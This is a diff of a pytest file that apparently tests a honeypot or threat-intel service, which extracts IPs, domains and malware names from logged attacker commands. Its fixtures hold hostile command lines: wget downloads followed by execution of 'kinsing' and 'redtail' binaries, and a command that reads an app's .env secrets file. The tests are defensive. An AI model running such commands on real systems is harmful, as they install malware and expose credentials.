@@ -58,6 +58,37 @@ def test_team_sessions_look_up_tools_but_never_their_own_ip():
     assert [(t.kind, t.label) for t in rep.targets(s, raw)] == [("tool", "kinsing")]
 
 
+# what demo_agent ran live: local curls that save nothing, and a quoted lan Host header
+AGENT_CMD8 = ("echo \"=== web / ===\"; curl -s -m5 -H 'Host: shop.quillfern.lan' http://127.0.0.1/health; echo; "
+              "curl -s -m5 -o /dev/null -w '%{http_code}\n' http://127.0.0.1/; echo \"=== sudo ===\"; "
+              "sudo -n -l 2>&1 | head; echo \"=== .env perms ===\"; ls -l /opt/app/.env; cat /opt/app/.env 2>&1 | head")
+
+
+@pytest.mark.parametrize("source", ["team", "wild"])
+def test_agent_command_8_searches_nothing_but_the_wild_ip(source):
+    rep = service()
+    s = Session("x", source=source, src_ip="1.2.3.4", ip_hash="a" * 64)
+    s.add_login(0, "team", True)
+    targets = rep.targets(s, {"type": "command", "detail": {"input": AGENT_CMD8}})
+    # no loopback "domain", no "health", no "null" from -o /dev/null
+    assert [t.kind for t in targets] == (["ip"] if source == "wild" else [])
+
+
+@pytest.mark.parametrize("line", [
+    "wget http://10.0.0.5/kinsing; chmod +x kinsing",
+    "wget http://192.168.1.20/kinsing; chmod +x kinsing",
+    "wget http://169.254.169.254/kinsing; chmod +x kinsing",
+    "wget http://[::1]/kinsing; chmod +x kinsing",
+    "wget http://localhost/kinsing; chmod +x kinsing",
+    "wget http://files.local/kinsing; chmod +x kinsing",
+])
+def test_private_hosts_are_skipped_but_the_tool_still_counts(line):
+    rep = service()
+    s = Session("x", source="team", src_ip="1.2.3.4", ip_hash="a" * 64)
+    s.add_login(0, "team", True)
+    assert [(t.kind, t.label) for t in rep.targets(s, {"type": "command", "detail": {"input": line}})] == [("tool", "kinsing")]
+
+
 async def test_failed_login_scan_never_searches():
     serp = FakeSerp()
     rep = service(serp=serp)
@@ -261,7 +292,7 @@ def _logged_in():
 
 def test_generic_word_filter_is_never_searched():
     rep = service()
-    raw = {"type": "command", "detail": {"input": "cd /tmp; wget http://203.0.113.9/filter; chmod +x filter; ./filter"}}
+    raw = {"type": "command", "detail": {"input": "cd /tmp; wget http://45.9.1.2/filter; chmod +x filter; ./filter"}}
     targets = rep.targets(_logged_in(), raw)
     # the download host still counts, the generic file name doesn't
     assert [t.kind for t in targets] == ["ip", "domain"]
@@ -270,7 +301,7 @@ def test_generic_word_filter_is_never_searched():
 
 def test_dropped_binary_name_is_searched_after_the_ip():
     rep = service()
-    line = "cd /tmp; wget http://203.0.113.9/redtail.x86_64; chmod +x redtail.x86_64; ./redtail.x86_64"
+    line = "cd /tmp; wget http://45.9.1.2/redtail.x86_64; chmod +x redtail.x86_64; ./redtail.x86_64"
     targets = rep.targets(_logged_in(), {"type": "command", "detail": {"input": line}})
     assert [t.kind for t in targets] == ["ip", "domain", "tool"]
     assert targets[2].query == '"redtail.x86_64" linux malware'
